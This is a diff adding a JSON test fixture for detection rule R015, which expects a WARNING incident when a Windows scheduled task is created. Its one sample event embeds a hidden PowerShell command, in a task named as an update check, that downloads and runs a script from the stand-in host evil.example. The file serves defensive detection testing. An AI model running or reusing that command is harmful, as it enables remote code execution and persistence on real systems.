@@ -1,0 +1,23 @@
+{
+  "name": "r015-scheduled-task-persistence",
+  "description": "R015: Windows 4698 scheduled task creation. Expects R015 WARNING incident (alert-only).",
+  "base_time": "2026-11-12T13:05:00Z",
+  "requires_rules": ["R015"],
+  "sources": [
+    {
+      "source_type": "WINDOWS_SECURITY",
+      "hostname": "WIN-SRV-01",
+      "lines": [
+        { "offset_seconds": 0, "raw": "<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4698</EventID></System><EventData><Data Name=\"SubjectUserName\">SYSTEM</Data><Data Name=\"TaskName\">\\Windows\\UpdateCheck</Data><Data Name=\"TaskContent\">powershell -w hidden -c iex(New-Object Net.WebClient).DownloadString('http://evil.example/x.ps1')</Data></EventData></Event>" }
+      ]
+    }
+  ],
+  "assert": {
+    "expect_incidents": [
+      { "rule_id": "R015", "min_severity": "WARNING", "min_count": 1 }
+    ],
+    "expect_entity_risk": [
+      { "entity_type": "USER", "value": "system", "min_score": 10 }
+    ]
+  }
+}
